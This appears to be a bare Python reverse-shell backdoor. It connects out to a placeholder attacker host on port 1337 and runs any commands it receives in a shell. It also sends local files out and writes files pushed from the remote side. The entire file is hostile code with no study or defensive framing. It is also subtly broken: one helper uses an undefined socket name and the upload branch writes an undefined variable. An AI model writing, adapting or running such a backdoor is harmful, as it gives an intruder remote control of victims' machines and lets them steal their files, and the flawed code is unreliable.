import socket
import subprocess

import os

payload = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

payload.connect(("attacker_ip", 1337))

print("Connected")

def send_data(ouput_data):
    size_of_data = len(ouput_data)
    size_of_data = str(size_of_data)
    payload.send(bytes(size_of_data, "utf-8"))
    payload.send(ouput_data)

def recv_data():
    original_size = connection.recv(2048).decode("utf-8")
    original_size = int(original_size)
    
    data = connection.recv(2048)
    while len(data) != original_size:
        data = data + connection.recv(2048)
    return data
 
while True:
	try: 
		cmd = payload.recv(2048)
		cmd = cmd.decode("utf-8")
		
		if cmd == "quit":
			payload.close()
			break
		
		elif cmd[:2] == "cd":
			os.chdir(cmd[3:])
			
			send_data(b"Changed directory")
			continue

		elif cmd[:8] == "download":
			with open(f'{cmd[9:]}', 'rb') as data:
				data_read = data.read()
				data.close()

				send_data(data_read)
				continue
		
		elif cmd[:6] == "upload":
			data = recv_data()
			if data == b"Error":
				continue
			with open(f'{cmd[7:]}', 'wb') as write_data:
				write_data.write(file_output)
				write_data.close()
			continue 

		output = subprocess.check_output(cmd, shell = True)

		send_data(output)

	except FileNotFoundError:
		print("File Not Found")
		send_data(b"Error")
	except subprocess.CalledProcessError:
		send_data(b"Wrong command")

print("Disconnected")